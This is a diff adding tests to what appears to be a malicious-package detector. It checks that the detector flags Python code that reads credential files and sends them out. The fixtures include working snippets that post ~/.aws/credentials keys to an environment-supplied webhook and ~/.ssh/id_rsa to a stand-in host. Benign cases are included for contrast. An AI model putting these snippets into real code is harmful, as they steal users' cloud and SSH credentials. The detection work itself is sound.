@@ -301,6 +301,61 @@ class TestAHiddenDestination:
         assert self.details(source) == []
 
 
+class TestACredentialStoreSent:
+    """Group A (a): http_query 0.0.1 reads ~/.aws/credentials with configparser, gathers the keys
+    into a list and posts it to a webhook taken from the environment. A credential store's contents
+    are sent wherever they go: no client sends the file itself."""
+
+    @staticmethod
+    def secret(source: str) -> list[str]:
+        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail.startswith("secret")]
+
+    def test_a_store_read_by_configparser_gathered_and_posted(self):
+        source = (
+            "import configparser, json, os, requests\n"
+            "def push(hook):\n"
+            "    path = os.path.join(os.path.expanduser('~'), '.aws', 'credentials')\n"
+            "    config = configparser.RawConfigParser()\n"
+            "    config.read(path)\n"
+            "    found = []\n"
+            "    for section in config.sections():\n"
+            "        d = {}\n"
+            "        d['key'] = config.get(section, 'aws_access_key_id')\n"
+            "        found.append(d)\n"
+            "    requests.post(hook, data=json.dumps(found))\n"
+            "push(os.environ.get('HOOK'))\n"
+        )
+        assert self.secret(source) == ["secret sent: CREDENTIAL_FILE to ?"]
+
+    def test_a_store_opened_with_with_and_sent(self):
+        source = (
+            "import os, requests\n"
+            "with open(os.path.expanduser('~/.ssh/id_rsa')) as f:\n"
+            "    key = f.read()\n"
+            "requests.post('https://collector.example.invalid', data=key)\n"
+        )
+        assert self.secret(source) == ["secret sent: CREDENTIAL_FILE to collector.example.invalid"]
+
+    def test_an_sdk_reading_the_store_to_sign_is_not(self):
+        source = (
+            "import configparser, os, requests\n"
+            "config = configparser.RawConfigParser()\n"
+            "config.read(os.path.expanduser('~/.aws/credentials'))\n"
+            "region = 'us-east-1'\n"
+            "requests.get('https://sts.amazonaws.com/', params={'r': region})\n"
+        )
+        assert self.secret(source) == []
+
+    def test_a_settings_file_posted_is_not_a_store(self):
+        source = (
+            "import os, requests\n"
+            "with open(os.path.expanduser('~/.myapp/settings.json')) as f:\n"
+            "    data = f.read()\n"
+            "requests.post('https://api.example.invalid/sync', data=data)\n"
+        )
+        assert self.secret(source) == []
+
+
 class TestAWalletKeySent:
     """Group A (a) step 2: a wallet signs with its key locally and never sends it (web3_py_checksum
     1.1 put `account.key.hex()` in a chat-bot URL). A homeless credential: any written host is out."""
